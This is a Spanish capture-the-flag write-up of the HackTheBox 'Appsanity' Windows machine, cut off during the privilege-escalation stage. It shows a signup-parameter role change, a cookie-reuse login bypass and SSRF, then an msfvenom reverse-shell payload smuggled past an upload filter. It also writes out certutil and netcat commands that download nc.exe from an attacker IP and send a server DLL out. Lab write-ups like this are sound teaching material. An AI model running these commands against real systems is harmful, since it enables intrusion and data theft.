<!doctype html><html lang=es><head><title>'Appsanity' Machine HTB WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="'Appsanity' HTB Machine WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="'Appsanity' Machine HTB WriteUp"><meta name=twitter:description content="'Appsanity' HTB Machine WriteUp"><meta property="og:title" content="'Appsanity' Machine HTB WriteUp"><meta property="og:description" content="'Appsanity' HTB Machine WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/appsanity/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-08T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-08T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/appsanity/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/appsanity/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/appsanity/>'Appsanity' Machine HTB WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-03-08T00:00:00Z>8 marzo, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
16 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/windows/>windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/hard/>hard</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/winrm/>winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/cookie-bypass/>cookie bypass</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/evil-winrm/>evil-winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/powershell/>powershell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/cmd/>cmd</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/reverse-engineering/>reverse engineering</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/dnspy/>dnspy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ghidra/>ghidra</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/burpsuite/>burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/crackmapexec/>crackmapexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ssrf/>ssrf</a></span></div></div></header><div class=post-content><h1 id=m√°quina-appsanity--appsanity-machine>M√°quina &ldquo;Appsanity&rdquo; / &ldquo;Appsanity&rdquo; Machine
<a class=heading-link href=#m%c3%a1quina-appsanity--appsanity-machine><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Dificultad: <em>Hard/Dif√≠cil</em></li><li>Plataforma: <em>HackTheBox</em></li></ul><p><img src=/pentesting/images/Appsanity_avatar.png alt="&lsquo;Appsanity&rsquo; Avatar"></p><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>El escaneo de <code>Nmap</code> muestra 3 puertos abiertos: <code>80</code> <code>HTTP</code>, <code>443</code> <code>HTTPs</code>, and <code>5895</code> <code>Windows Remote Management (WinRM)</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>#</span> Nmap 7.94SVN scan initiated Thu Mar  <span class=m>7</span> 22:16:14 <span class=m>2024</span> as: nmap -sVC -p80,443,5985,7680 -oN targeted 10.10.11.238
</span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.238
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.20s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE    VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp   open  http       Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to https://meddigi.htb/
</span></span></span><span class=line><span class=cl><span class=go>443/tcp  open  https?
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span></code></pre></div><ul><li>Del scan de <code>Nmap</code> puedo ver que para el puerto <code>80</code> √©ste redirige al dominio <code>meddigi.htb</code>. De manera que agrego este dominio al archivo <code>/etc/hosts</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo echo &#39;10.10.11.238 meddigi.htb&#39; &gt;&gt; /etc/hosts
</span></span></span></code></pre></div><ul><li>Visitando <code>https://meddigi.htb</code> ( y luego de &ldquo;aceptar el riesgo&rdquo; puesto que la p√°gina tiene un certificado autofirmado) puedo ver una p√°gina web que ofrece servicios m√©dicos:
<img src=/pentesting/images/Appsanity_1.png alt="Appsanity image 1"></li><li>En la parte superior derecha de la p√°gina web puedo ver que puedo ver un panel de login, en el cual adem√°s puedo crearme un usuario/cuenta. Pruebo las t√≠picas credenciales <code>admin:admin</code> y similares, pero no funciona.</li><li>Me creo un usuario, logueo y puedo ver algo como lo siguiente:
<img src=/pentesting/images/Appsanity_2.png alt="Appsanity image 2"></li><li>Contin√∫o analizando la p√°gina web, pero no hallo nada interesante</li><li>Ahora, intentare encontrar <code>Virtual Hostings (Vhosts)</code> usando <code>ffuf</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://meddigi.htb/ -H &#39;Host: FUZZ.meddigi.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : https://meddigi.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.meddigi.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>portal                  [Status: 200, Size: 2976, Words: 1219, Lines: 57, Duration: 2833ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [4989/4989] :: Job [1/1] :: 60 req/sec :: Duration: [0:01:27] :: Errors: 0 ::
</span></span></span></code></pre></div><p>y encuentro algo: <code>portal</code>. De manera que agrego <code>portal.meddigi.htb</code> en la misma l√≠nea donde previamente hab√≠a agregado <code>meddigi.htb</code> en mi archivo <code>/etc/hosts</code>, de manera que ahora √©ste se ve como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>127.0.0.1       localhost
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.238 meddigi.htb portal.meddigi.htb
</span></span></span></code></pre></div><ul><li>Luego de agregar este sitio a mi archivo <code>/etc/hosts</code> visito <code>https://portal.meddigi.htb</code> y puedo ver un portal de login:
<img src=/pentesting/images/Appsanity_3.png alt="Appsanity image 3">
Aparentemente, es un portal hecho para que los m√©dicos que trabajan en la empresa puedan entrar</li><li>Devuelta al sitio <code>https://meddigi.htb</code> me intento crear una nueva cuenta, pero esta vez interceptar√© la petici√≥n al crear la cuenta con <code>Burpsuite</code>. Noto que cuando me creo una cuenta puedo ver un par√°metro en la petici√≥n llamado <code>Acctype</code>, el cual por defecto tiene el valor <code>1</code>. De manera que cambio ese valor a <code>Acctype=2</code> y mantengo todo el resto de los par√°metros exactamente iguales.
<img src=/pentesting/images/Appsanity_4.png alt="Appsanity image 4"></li><li>Ahora voy a la secci√≥n <code>Sign In</code> del sitio web <code>https://meddigi.htb</code>, pero esta vez me logueo con la nueva cuenta creada llamada <code>testTwo</code> (dado que el sitio web no aceptaba n√∫meros para los par√°metros <code>First Name</code> y <code>Last Name</code> al crear el usuario). Ahora mi panel al loguear es levemente diferente, dado que ahora puedo ver, al lado derecho, la opci√≥n <code>Patients</code> (Pacientes) la cual muestra los usuarios que me hab√≠a creado previamente cuando estaba testeando la p√°gina:
<img src=/pentesting/images/Appsanity_5.png alt="Appsanity image 5.png">
de manera que, al parecer, hemos creado exitosamente un usuario con el rol <code>Doctor</code> (o algo por el estilo)</li><li>Como sea, aparentemente s√≥lo puedo ver usuarios (pacientes) y nada m√°s</li><li>De vuelta al sitio web <code>https://portal.meddigi.htb</code> decido chequear las cookies. En <code>Firefox</code> hago lo siguiente: <code>Click Derecho -> Inspect -> Storage</code>. Pero no veo ninguna cookie/data guardada. No obstante, si clickeamos en el s√≠mbolo &ldquo;M√°s&rdquo; <code>+</code> al lado derecho (si pongo mi mouse encima de √©ste dice <code>Add Item</code> (A√±adir √≠tem)) puedo agregar/modificar la data guardada.
<img src=/pentesting/images/Appsanity_7.png alt="Appsanity image 7"></li><li>¬øQu√© pasa si agregamos las cookies/data guardada del sitio web <code>https://meddigi.htb</code> de nuestra cuenta creada como Doctor, pero ahora en este sitio web? De manera que veo mis cookies de <code>https://meddigi.htb</code>
<img src=/pentesting/images/Appsanity_6.png alt="Appsanity image 6">
Copio el valor de <code>access_token</code> y lo paso a la web <code>https://portal.meddigi.htb</code>:
<img src=/pentesting/images/Appsanity_8.png alt="Appsanity image 8"></li><li>Recargo la p√°gina y estamos dentro. De manera que hemos bypasseado el login:
<img src=/pentesting/images/Appsanity_9.png alt="Appsanity image 9"></li><li>Una vez dentro puedo ver muchas opciones en este manel disponibles al lado izquierdo de √©ste. <code>Issue Prescriptions</code> llama mi atenci√≥n dado que lo puedo llenar con datos. Luego de probar distintas cosas, noto que podemos realizar un <code>Server-Side Request Forgery (SSRF)</code> si llamamos <code>http://127.0.0.1:8080</code> en el campo <code>Prescription Link</code>:
<img src=/pentesting/images/Appsanity_10.png alt=Appsanity_10.png>
Si hago click en <code>Submit</code> puedo ver reportes que aparecen en una ventana emergente.</li><li>Desde la ventana emergente del <code>SSRF</code> noto que, cuando pongo mi mouse sobre la palabra/link <code>View Report</code>, el server interpreta archivos <code>aspx</code> dado que tenemos una variable llamada <code>ViewReport.aspx</code>. Por esta raz√≥n me creo un archivo malicioso<code>.aspx</code> usando <code>msfvenom</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f aspx -o shell.aspx
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span></span><span class=line><span class=cl><span class=go>No encoder specified, outputting raw payload
</span></span></span><span class=line><span class=cl><span class=go>Payload size: 460 bytes
</span></span></span><span class=line><span class=cl><span class=go>Final size of aspx file: 3425 bytes
</span></span></span><span class=line><span class=cl><span class=go>Saved as: shell.aspx
</span></span></span></code></pre></div><p>donde <code>10.10.16.6</code> es mi IP de atacante y <code>443</code> es el puerto por el cual empezar√© a escuchar con <code>netcat</code>. Llamar√© a este archivo <code>shell.aspx</code></p><ul><li>Al lado izquierdo hago click en <code>Upload Reports</code>, relleno los datos con cualquier data random, pero al final adjunto el archivo malicioso <code>shell.aspx</code> e intento subirlo</li><li>Al principio esto no funciona dado que, aparentemente, hay un filtro que no est√° aceptando el archivo subido. De manera que al subir el archivo intercepto la petici√≥n con <code>Burpsuite</code>, y, al principio del payload agrego el magic byte <code>%PDF-1.7</code> y el archivo, aparentemente, se sube.
<img src=/pentesting/images/Appsanity_10_5.png alt="Bypass PDF"></li><li>Devuelta a la pesta√±a <code>Issue Prescriptions</code>, relleno el campo <code>Email address</code> con lo que sea y <code>Prescription Link</code> con <code>http://127.0.0.1:8080</code> para explotar/abusar del <code>SSRF</code> y puedo ver lo siguiente; el archivo malicioso:
<img src=/pentesting/images/Appsanity_11.png alt="Checking malicious file">
donde, si nos fijamos en la parte inferior izquierda de la imagen anterior, podemos ver el link que es llamado cuando clickeamos sobre √©ste.</li><li>En mi reporte malicioso (el link <code>View Report</code>), hago click derecho sobre √©ste y luego en <code>Copy Link</code> (Copiar Link) donde obtengo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>https://portal.meddigi.htb/ViewReport.aspx?file=7b6ed9d4-8963-4d79-9189-abd49df52ad1_shell.aspx
</span></span></code></pre></div><p>pero dado que en realidad quiero abusar del <code>SSRF</code>, cambiar√© la parte que dice <code>https://portal.meddigi.htb</code> a <code>http://127.0.0.1:8080</code>, de manera que esta variable/url queda como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://127.0.0.1:8080/ViewReport.aspx?file=7b6ed9d4-8963-4d79-9189-abd49df52ad1_shell.aspx
</span></span></code></pre></div><ul><li>Finalmente, empiezo un listener con <code>netcat</code> en el puerto <code>443</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 443
</span></span></span></code></pre></div><p>y en la p√°gina web, en el campo <code>Prescription Link</code>, procedo a pasar el link indicado arriba:
<img src=/pentesting/images/Appsanity_12.png alt=Appsanity_12.png>
clickeo en <code>Submit</code></p><ul><li>Y obtengo una reverse shell:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.238] 51532
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.3570]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\windows\system32\inetsrv&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>appsanity\svc_exampanel
</span></span></span></code></pre></div><p>donde podemos obtener la flag de usuario en el <code>Desktop</code> de <code>svc_exampanel</code>.</p><h2 id=nt-authoritysystem---administrator--administrador>NT Authority/System - Administrator / Administrador
<a class=heading-link href=#nt-authoritysystem---administrator--administrador><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Este usuario no tiene ning√∫n permiso que llame la atenci√≥n:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users&gt;whoami /priv
</span></span></span><span class=line><span class=cl><span class=go>whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                          State
</span></span></span><span class=line><span class=cl><span class=go>============================= ==================================== ========
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeShutdownPrivilege           Shut down the system                 Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeAuditPrivilege              Generate security audits             Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeUndockPrivilege             Remove computer from docking station Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeTimeZonePrivilege           Change the time zone                 Disabled
</span></span></span></code></pre></div><p>de manera que descarto este vector de momento</p><ul><li>Puedo ver un directorio <code>inetpub</code> ubicado en <code>C:\</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\&gt;dir
</span></span></span><span class=line><span class=cl><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of c:\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>09/24/2023  01:25 AM    &lt;DIR&gt;          inetpub
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  10:30 AM    &lt;DIR&gt;          Microsoft
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  01:14 AM    &lt;DIR&gt;          PerfLogs
</span></span></span><span class=line><span class=cl><span class=go>10/23/2023  03:59 PM    &lt;DIR&gt;          Program Files
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  03:59 PM    &lt;DIR&gt;          Program Files (x86)
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  07:28 PM    &lt;DIR&gt;          Users
</span></span></span><span class=line><span class=cl><span class=go>10/23/2023  11:40 AM    &lt;DIR&gt;          Windows
</span></span></span><span class=line><span class=cl><span class=go>               0 File(s)              0 bytes
</span></span></span><span class=line><span class=cl><span class=go>               7 Dir(s)   3,995,791,360 bytes free
</span></span></span></code></pre></div><ul><li>Luego de husmear un poco, llego a la carpeta/directorio:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\inetpub\ExaminationPanel\ExaminationPanel\bin&gt;dir
</span></span></span><span class=line><span class=cl><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of c:\inetpub\ExaminationPanel\ExaminationPanel\bin
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>09/26/2023  06:30 AM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>09/26/2023  06:30 AM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM         4,991,352 EntityFramework.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM           591,752 EntityFramework.SqlServer.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM            13,824 ExaminationManagement.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM            40,168 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:49 AM    &lt;DIR&gt;          roslyn
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM           431,792 System.Data.SQLite.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM           206,512 System.Data.SQLite.EF6.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM           206,520 System.Data.SQLite.Linq.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:49 AM    &lt;DIR&gt;          x64
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:49 AM    &lt;DIR&gt;          x86
</span></span></span><span class=line><span class=cl><span class=go>               7 File(s)      6,481,920 bytes
</span></span></span><span class=line><span class=cl><span class=go>               5 Dir(s)   3,995,791,360 bytes free
</span></span></span></code></pre></div><ul><li>Para transferir archivos desde la m√°quina v√≠ctima <code>Windows</code> a mi m√°quina atacante <code>Linux</code> procedo a subir un binario de <code>netcat</code> para <code>Windows</code>. Empiezo un servidor <code>Python</code> <code>HTTP</code> temporal en el puerto <code>80</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 -m http.server 80
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</span></span></span></code></pre></div><p>y en la m√°quina v√≠ctima (luego de moverme a <code>C:\Users\Public\Downloads\</code>, un directorio donde s√≠ tengo permiso de escritura de archivos) descargo el ejecutable de <code>netcat</code> usando <code>certutil</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\inetpub\ExaminationPanel\ExaminationPanel\bin&gt;cd C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go>cd C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;certutil.exe -urlcache -split -f http://10.10.16.6:80/nc.exe .\nc.exe
</span></span></span><span class=line><span class=cl><span class=go>certutil.exe -urlcache -split -f http://10.10.16.6:80/nc.exe .\nc.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  b0d8
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;dir
</span></span></span><span class=line><span class=cl><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>03/07/2024  07:57 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  07:57 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  07:57 PM            45,272 nc.exe
</span></span></span><span class=line><span class=cl><span class=go>               1 File(s)         45,272 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   3,995,688,960 bytes free
</span></span></span></code></pre></div><ul><li>Ahora s√≠ puedo pasar los archivos. M√°s espec√≠ficamente, voy a trensferir el archivo <code>ExaminationManagement.dll</code> localizado en <code>c:\inetpub\ExaminationPanel\ExaminationPanel\bin</code>. En la m√°quina v√≠ctima procedo a correr:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\nc.exe 10.10.16.6 4444 -w 3 &lt; c:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>.\nc.exe 10.10.16.6 4444 -w 3 &lt; c:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll
</span></span></span></code></pre></div><p>y en mi listener de <code>netcat</code> obtengo y guardo el archivo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 4444 &gt; ExaminationManagement.dll
</span></span></span><span class=line><span class=cl><span class=go>listening on [any] 4444 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.238] 51540
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go>total 24
